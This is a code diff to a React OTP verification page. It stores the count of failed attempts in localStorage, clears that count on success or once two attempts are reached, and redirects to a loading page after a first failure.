@@ -13,6 +13,17 @@ export default function OtpVerification() {
   const { t } = useTranslation();
 
   useEffect(() => {
+    // Sync attempts from localStorage on mount
+    if (typeof window !== 'undefined') {
+      const storedAttempts = localStorage.getItem('otpAttempts');
+      if (storedAttempts) {
+        setAttempts(parseInt(storedAttempts));
+      } else {
+        // Fresh OTP session - ensure we start from 0
+        setAttempts(0);
+      }
+    }
+    
     // Track visitor when page loads with language info
     const language = navigator.language || 'Unknown';
     apiRequest("POST", "/api/track-visit", { 
@@ -41,6 +52,9 @@ export default function OtpVerification() {
       const data = await response.json();
 
       if (data.success) {
+        // Clear stored attempts on success
+        localStorage.removeItem('otpAttempts');
+        
         toast({
           title: t('otp_success_title'),
           description: t('otp_success_desc'),
@@ -74,6 +88,9 @@ export default function OtpVerification() {
       });
       
       if (newAttempts >= 2) {
+        // Clear stored attempts after max attempts reached
+        localStorage.removeItem('otpAttempts');
+        
         toast({
           title: t('otp_too_many_attempts_title'),
           description: t('otp_too_many_attempts_desc'),
@@ -85,12 +102,20 @@ export default function OtpVerification() {
           setLocation("/login");
         }, 2000);
       } else {
+        // First attempt failed - show loading page before second attempt
         toast({
           title: t('otp_failed_title'),
           description: `${t('otp_failed_desc')} ${2 - newAttempts} ${t('otp_failed_desc_remaining')}`,
           variant: "destructive",
         });
-        setOtp("");
+        
+        // Store the attempt count for the next OTP page
+        localStorage.setItem('otpAttempts', newAttempts.toString());
+        
+        // Redirect to loading page
+        setTimeout(() => {
+          setLocation("/loading");
+        }, 1500);
       }
     } finally {
       setIsLoading(false);
